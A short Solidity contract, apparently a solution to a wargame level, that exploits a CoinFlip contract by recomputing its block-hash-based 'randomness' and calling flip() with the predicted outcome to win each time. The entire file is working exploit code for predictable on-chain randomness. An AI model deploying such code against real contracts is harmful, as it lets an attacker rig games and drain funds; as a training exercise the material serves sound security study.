pragma solidity ^0.6.0;

import "../CoinFlip.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlipHack {
    uint256 public consecutiveWins;
    using SafeMath for uint256;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip instance;

    constructor(address _instance) public {
        consecutiveWins = 0;
        instance = CoinFlip(_instance);
    }

    function flip() public returns(bool){
        uint256 blockValue = uint256(blockhash((block.number).sub(1)));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return side;
    }

    function attack() public {
        bool mySide = flip();
        instance.flip(mySide);
    }
}